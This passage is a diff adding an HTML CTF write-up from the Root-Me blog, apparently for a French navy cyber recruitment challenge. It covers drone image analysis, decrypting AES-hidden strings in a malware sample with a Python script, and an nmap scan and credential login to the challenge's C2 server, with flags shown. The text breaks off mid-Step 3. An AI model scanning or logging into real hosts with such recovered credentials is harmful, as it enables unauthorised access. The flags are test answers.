@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Writeup - ComCyber - Marine Nationale Recrutement CTF - Root-Me Blog</title><meta name="Description" content="Root Me allows everyone to test and improve their knowledge in computer security and hacking. Legal. Free. Realistic."><meta property="og:title" content="Writeup - ComCyber - Marine Nationale Recrutement CTF" />
+<meta property="og:description" content="Solution of the recruitment CTF of ComCyber during September 2024" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.root-me.org/posts/writeup_comcyber_marine/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-03-31T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-03-31T00:00:00+00:00" /><meta property="og:site_name" content="Root-Me Blog" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Writeup - ComCyber - Marine Nationale Recrutement CTF"/>
+<meta name="twitter:description" content="Solution of the recruitment CTF of ComCyber during September 2024"/>
+<meta name="application-name" content="Root-Me Blog">
+<meta name="apple-mobile-web-app-title" content="Root-Me Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.root-me.org/posts/writeup_comcyber_marine/" /><link rel="prev" href="https://blog.root-me.org/posts/writeup_snippet_05/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Writeup - ComCyber - Marine Nationale Recrutement CTF",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.root-me.org\/posts\/writeup_comcyber_marine\/"
+        },"genre": "posts","keywords": "comcyber, writeup, solution","wordcount":  3723 ,
+        "url": "https:\/\/blog.root-me.org\/posts\/writeup_comcyber_marine\/","datePublished": "2025-03-31T00:00:00+00:00","dateModified": "2025-03-31T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nishacid"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Root-Me Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
+        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
+        data-sizes="auto"
+        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
+        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Root-Me Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
+        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
+        data-sizes="auto"
+        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
+        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup - ComCyber - Marine Nationale Recrutement CTF</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.root-me.org/Nishacid" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nishacid</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-03-31">2025-03-31</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3723 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;18 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#context">Context</a></li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#step-1---analysis">Step 1 - Analysis</a></li>
+    <li><a href="#step-2---forensicreverse">Step 2 - Forensic/Reverse</a>
+      <ul>
+        <li><a href="#encryptiondecryption-routine">Encryption/decryption routine</a></li>
+        <li><a href="#key-and-iv-generation">Key and IV generation</a></li>
+        <li><a href="#secrets-strings">Secrets strings</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-3---web">Step 3 - Web</a></li>
+    <li><a href="#step-4---privileges-escalation">Step 4 - Privileges Escalation</a></li>
+    <li><a href="#step-5---forensic">Step 5 - Forensic</a>
+      <ul>
+        <li><a href="#1-static-key">1. Static key</a></li>
+        <li><a href="#2-initialization-vector">2. Initialization vector</a></li>
+        <li><a href="#3-dynamic-key">3. Dynamic key</a></li>
+        <li><a href="#4-encrypted-folder-name--malware-launch-date">4. Encrypted folder name &amp; Malware launch date</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-6---iot">Step 6 - IoT</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="context">Context</h2>
+<p>On <strong>March 3, 2025</strong>, the <a href="https://www.defense.gouv.fr/comcyber/commandement-cyberdefense-comcyber" target="_blank" rel="noopener noreffer ">Commandement de la Cyberdéfense (ComCyber)</a> and the <a href="https://www.defense.gouv.fr/marine" target="_blank" rel="noopener noreffer ">Marine Nationale</a> launched a unique challenge running until <strong>March 31, 2025</strong>. Created by <a href="https://pro.root-me.org/" target="_blank" rel="noopener noreffer ">Root-Me Pro</a>, it is part of ComCyber&rsquo;s recruitment campaign for cyber sous-officers.</p>
+<p>This &ldquo;realistic&rdquo; challenge consists of several stages, each focusing on a specific professional domain:</p>
+<ul>
+<li><strong>Analysis</strong></li>
+<li><strong>Forensic</strong></li>
+<li><strong>Reverse Engineering</strong></li>
+<li><strong>Web</strong></li>
+<li><strong>Privileges Escalation</strong></li>
+<li><strong>IoT</strong></li>
+</ul>
+<h2 id="introduction">Introduction</h2>
+<p>The challenge begins with a homepage that introduces players to the context of the challenge, explains the objectives, and outlines the process.
+This homepage can be accessed at the following address:</p>
+<ul>
+<li><a href="https://marine.pro.root-me.org/" target="_blank" rel="noopener noreffer ">https://marine.pro.root-me.org/</a></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/home.png"
+        data-srcset="/assets/images/writeups/marine/home.png, /assets/images/writeups/marine/home.png 1.5x, /assets/images/writeups/marine/home.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/home.png"
+        title="marine_home" /></p>
+<p>Players are then invited to click the &ldquo;Start Challenge&rdquo; button and fill out a form containing required and optional information.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/register.png"
+        data-srcset="/assets/images/writeups/marine/register.png, /assets/images/writeups/marine/register.png 1.5x, /assets/images/writeups/marine/register.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/register.png"
+        title="marine_register" /></p>
+<p>Once the form is filled out, players can now login into and see a dashboard that presents the context and objectives of the mission.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/dashboard.png"
+        data-srcset="/assets/images/writeups/marine/dashboard.png, /assets/images/writeups/marine/dashboard.png 1.5x, /assets/images/writeups/marine/dashboard.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/dashboard.png"
+        title="marine_dashboard" /></p>
+<p>The first mission aims to identify a drone that has flown over a military zone and issue an alert.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/mission1.png"
+        data-srcset="/assets/images/writeups/marine/mission1.png, /assets/images/writeups/marine/mission1.png 1.5x, /assets/images/writeups/marine/mission1.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/mission1.png"
+        title="marine_mission" /></p>
+<h2 id="step-1---analysis">Step 1 - Analysis</h2>
+<p>We have received a set of surveillance images showing an unknown drone flying close to a military vessel. The aim is to extract visual clues from these images in order to determine the drone&rsquo;s manufacturer and serial number. The extracted serial number follows the <code>RM{Serial Number}</code> format.
+By analyzing the images, the results are as follows:</p>
+<ul>
+<li><code>cam1_pic1.png</code>: shows a drone flying over a military ship. The image contains various user interface elements. Zoom in to see <code>6X9</code>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/cam1.png"
+        data-srcset="/assets/images/writeups/marine/cam1.png, /assets/images/writeups/marine/cam1.png 1.5x, /assets/images/writeups/marine/cam1.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/cam1.png"
+        title="marine_cam1" /></p>
+<ul>
+<li><code>cam2_pic1.png</code> : black and white thermal image of the drone, taken from a higher altitude. We detected the text <code>3BQ</code> on the drone.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/cam2.png"
+        data-srcset="/assets/images/writeups/marine/cam2.png, /assets/images/writeups/marine/cam2.png 1.5x, /assets/images/writeups/marine/cam2.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/cam2.png"
+        title="marine_cam2" /></p>
+<ul>
+<li><code>cam3_pic1.png</code>: sharper image of the drone, revealing the <code>6X9</code> and <code>AVP</code> markings on its fuselage.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/cam3.png"
+        data-srcset="/assets/images/writeups/marine/cam3.png, /assets/images/writeups/marine/cam3.png 1.5x, /assets/images/writeups/marine/cam3.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/cam3.png"
+        title="marine_cam3" /></p>
+<ul>
+<li><code>cam4_pic1.png</code> : side shot where no additional serial number has been identified.</li>
+</ul>
+<p>Once reconstructed, we obtain the drone&rsquo;s serial number, which is the following flag:</p>
+<ul>
+<li><strong>RM{3BQAVP6X9}</strong></li>
+</ul>
+<h2 id="step-2---forensicreverse">Step 2 - Forensic/Reverse</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/mission2.png"
+        data-srcset="/assets/images/writeups/marine/mission2.png, /assets/images/writeups/marine/mission2.png 1.5x, /assets/images/writeups/marine/mission2.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/mission2.png"
+        title="marine_mission2" /></p>
+<p>In this step, we reverse-engineer the malware code to recover four values hidden inside the binary. We open the <code>VPNUpdater.exe</code> binary and the <code>VPNUpdater.dll</code> file in the <strong>DNSpy</strong> tool and note that some values are of interest. These values are returned by the <code>L()</code>, <code>O()</code>, <code>N()</code> and <code>NBN()</code> functions, and are as follows:</p>
+<ul>
+<li><code>L()</code> - <strong>C2 server URL</strong></li>
+<li><code>O()</code> - <strong>user name</strong></li>
+<li><code>N()</code> - <strong>password</strong></li>
+<li><code>NBN()</code> - <strong>flag</strong></li>
+</ul>
+<p>The challenge is solved by understanding the encryption mechanism used in the C# code and reproducing the decryption process using Python.
+If you examine the C# source code, you&rsquo;ll notice several important points:</p>
+<h3 id="encryptiondecryption-routine">Encryption/decryption routine</h3>
+<p>All secret strings are <em>hidden</em> as AES ciphertext, encoded in Base64. Decryption is performed by the function <code>M(byte[] d, byte[] k, byte[] i)</code> :</p>
+<ul>
+<li>It creates an AES object, assigns it the <strong>key</strong> and <strong>initialization vector (IV</strong>), then uses a decryptor to recover the plaintext.</li>
+<li>The AES parameters are the default (<em>which, under .NET, means CBC mode with PKCS7 padding</em>).</li>
+</ul>
+<h3 id="key-and-iv-generation">Key and IV generation</h3>
+<p>The key and IV used for AES are derived from the <code>G()</code> and <code>H()</code> functions respectively:
+<code>G()</code> returns a string constructed from an array of characters :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C#" data-lang="C#"><span class="line"><span class="cl"><span class="k">new</span> <span class="kt">string</span><span class="p">(</span><span class="k">new</span> <span class="kt">char</span><span class="p">[]</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x41</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x41</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x24</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x46</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x32</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x2D</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x44</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x38</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x43</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x31</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x45</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x37</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x42</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x39</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x46</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x33</span><span class="p">,</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>This produces a string like :</p>
+<pre tabindex="0"><code>AA$F2-D8C1E7B9F3@C8@!BB2E1F0A7C3D
+</code></pre><p>During decryption, only the first 16 characters are used as the AES key:</p>
+<pre tabindex="0"><code>AA$F2-D8C1E7B9F3
+</code></pre><p>H() returns a similarly constructed string:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C#" data-lang="C#"><span class="line"><span class="cl"><span class="k">new</span> <span class="kt">string</span><span class="p">(</span><span class="k">new</span> <span class="kt">char</span><span class="p">[]</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x44</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x31</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x40</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x45</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x32</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x23</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x46</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x33</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x25</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x41</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x34</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x42</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x35</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x26</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x43</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="m">0x36</span><span class="p">,</span> <span class="p">...</span> 
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>This produces a string starting with :</p>
+<pre tabindex="0"><code>D1@E2#F3%A4B5&amp;C6...
+</code></pre><p>Here again, the first 16 characters are used as IV :</p>
+<pre tabindex="0"><code>D1@E2#F3%A4B5&amp;C6
+</code></pre><h3 id="secrets-strings">Secrets strings</h3>
+<p>Each of the four functions decrypts a Base64 string embedded in the code, using the key/IV above:</p>
+<ul>
+<li><code>L()</code> decrypt : <code>OF/sfn87WwjfIX14p17jp8mu5uavNFecb4D97pgVfZc=</code></li>
+<li><code>O()</code> decrypt : <code>3Npd3p5V7JSh6JZ5gqRmZg==</code></li>
+<li><code>N()</code> decrypt : <code>IeLkqcSXkaE8QamE7i4DEY3N7NmqJvAl1fzI7gIQkbo=</code></li>
+<li><code>NBN()</code> decrypt : <code>Wil860ds3vJiRDi+iTntnfknYML8iTowJsQe0uwmTms=</code></li>
+</ul>
+<p>Since decryption uses standard AES (CBC mode with PKCS7 padding), you can reproduce the process in Python (<code>pip install pycryptodome</code>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_no_unpad</span><span class="p">(</span><span class="n">ciphertext_b64</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ciphertext_b64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">unpad</span><span class="p">(</span><span class="n">decrypted</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;AA$F2-D8C1E7B9F3&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;D1@E2#F3%A4B5&amp;C6&#34;</span>       
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted_url</span>      <span class="o">=</span> <span class="s2">&#34;OF/sfn87WwjfIX14p17jp8mu5uavNFecb4D97pgVfZc=&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted_username</span> <span class="o">=</span> <span class="s2">&#34;3Npd3p5V7JSh6JZ5gqRmZg==&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted_password</span> <span class="o">=</span> <span class="s2">&#34;IeLkqcSXkaE8QamE7i4DEY3N7NmqJvAl1fzI7gIQkbo=&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted_flag</span>   <span class="o">=</span> <span class="s2">&#34;Wil860ds3vJiRDi+iTntnfknYML8iTowJsQe0uwmTms=&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Decrypt credentials</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c2_url</span>   <span class="o">=</span> <span class="n">decrypt_no_unpad</span><span class="p">(</span><span class="n">encrypted_url</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">decrypt_no_unpad</span><span class="p">(</span><span class="n">encrypted_username</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">decrypt_no_unpad</span><span class="p">(</span><span class="n">encrypted_password</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span>     <span class="o">=</span> <span class="n">decrypt_no_unpad</span><span class="p">(</span><span class="n">encrypted_flag</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;C2 URL:    &#34;</span><span class="p">,</span> <span class="n">c2_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Username:  &#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Password:  &#34;</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag:      &#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div><p>Once the python script is executed, we have the following output:</p>
+<pre tabindex="0"><code>(&#39;C2 URL:    &#39;, u&#39;http://163.172.66.233:3000&#39;)
+(&#39;Username:  &#39;, u&#39;admin&#39;)
+(&#39;Password:  &#39;, u&#39;wqHQBzgxXZ6mhpdbvL2KfE&#39;)
+(&#39;Flag:      &#39;, u&#39;RM{zd7aWBS98uRprCoLjqhKkx}&#39;)
+</code></pre><h2 id="step-3---web">Step 3 - Web</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/mission3.png"
+        data-srcset="/assets/images/writeups/marine/mission3.png, /assets/images/writeups/marine/mission3.png 1.5x, /assets/images/writeups/marine/mission3.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/mission3.png"
+        title="marine_mission3" /></p>
+<p>The step description indicates that we need to find a vulnerability allowing us to access the Command &amp; Control (C2) server. We have the IP address and port of C2, obtained in the previous step: <code>163.172.66.233:3000</code></p>
+<p>A port scan on the server&rsquo;s IP address using nmap reveals 2 open ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╰─λ nmap -T5 -sC -Pn 163.172.66.233
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-19 18:40 CET
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 163-172-66-233.rev.poneytelecom.eu <span class="o">(</span>163.172.66.233<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.013s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE
+</span></span><span class="line"><span class="cl">25/tcp   filtered smtp
+</span></span><span class="line"><span class="cl">3000/tcp open     ppp
+</span></span><span class="line"><span class="cl">5000/tcp open     upnp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1.48 seconds
+</span></span></code></pre></div><p>2 ports (<code>3000/tcp, 5000/tcp</code>) are accessible from the Internet. The use of netcat allows you to identify that the services listening on these two ports are in fact <strong>HTTP servers</strong> (and not <code>ppp/upnp</code>):</p>
+<p>Accessing both services from a browser, the service on port 3000 gives nothing of interest, but the service on port 5000 gives access to a connection panel to what appears to be a Command &amp; Control interface.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/c2.png"
+        data-srcset="/assets/images/writeups/marine/c2.png, /assets/images/writeups/marine/c2.png 1.5x, /assets/images/writeups/marine/c2.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/c2.png"
+        title="marine_c2" /></p>
+<p>Using the login details obtained in the previous step (<code>admin:wqHQBzgxXZ6mhpdbvL2KfE</code>), we gain access to the C2 administration panel:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/c2_dashboard.png"
+        data-srcset="/assets/images/writeups/marine/c2_dashboard.png, /assets/images/writeups/marine/c2_dashboard.png 1.5x, /assets/images/writeups/marine/c2_dashboard.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/c2_dashboard.png"
+        title="marine_c2_dashboard" /></p>
+<p>This administration interface is very minimalist, however on active agents (click on an agent from the list), a functionality to refresh their status is available:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/c2_refres.png"
+        data-srcset="/assets/images/writeups/marine/c2_refres.png, /assets/images/writeups/marine/c2_refres.png 1.5x, /assets/images/writeups/marine/c2_refres.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/c2_refres.png"
+        title="marine_c2_refresh" /></p>
+<p>In the console, what appears to be the command used to check whether the agent is online or not is displayed.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/c2_debug.png"
+        data-srcset="/assets/images/writeups/marine/c2_debug.png, /assets/images/writeups/marine/c2_debug.png 1.5x, /assets/images/writeups/marine/c2_debug.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/c2_debug.png"
